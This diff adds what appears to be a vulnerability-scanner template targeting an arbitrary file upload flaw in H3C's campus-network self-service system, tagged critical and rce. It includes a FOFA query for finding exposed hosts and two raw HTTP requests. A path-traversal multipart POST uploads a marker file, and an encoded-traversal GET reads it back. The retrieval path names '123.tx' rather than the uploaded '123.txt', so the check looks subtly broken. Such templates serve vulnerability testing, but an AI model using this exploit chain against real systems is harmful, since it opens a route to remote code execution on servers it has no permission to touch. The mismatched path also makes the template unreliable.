@@ -1,0 +1,40 @@
+## id: VEID-2024-0308
+## name: H3C-校园网自助服务系统flexfileupload任意文件上传漏洞
+## author: hack007x
+## severity: critical
+## tags: veid,file,veid2024,rce
+## description: 校园网自助服务系统存在任意文件上传漏洞
+## fofa-query: header="/selfservice"
+## verification: true
+
+
+POST /templates/attestation/../../servlet/DisplayExcelCustomReport HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Content-Type: multipart/form-data; boundary=---------------WebKitFormBoundaryMmx988TUuintqO4Q
+
+-----------------WebKitFormBoundaryMmx988TUuintqO4Q
+Content-Disposition: form-data; name="123.txt"; filename="123.txt"
+Content-Type: application/octet-stream
+Content-Length: 255
+
+hello veil
+-----------------WebKitFormBoundaryMmx988TUuintqO4Q--
+
+
+#@ matcher: status_code == 200
+
+---
+
+GET /imc/primepush/%2e%2e/flex/topobg/123.tx HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+#@ condition: and
+#@ matcher: body contains "hello veil"
+
+
+
+
+
+# @VEIL-STAMP: 40d490200920925f6c5cf2eb214aff5f7814671c3bcb8598a298bfb8e967754c
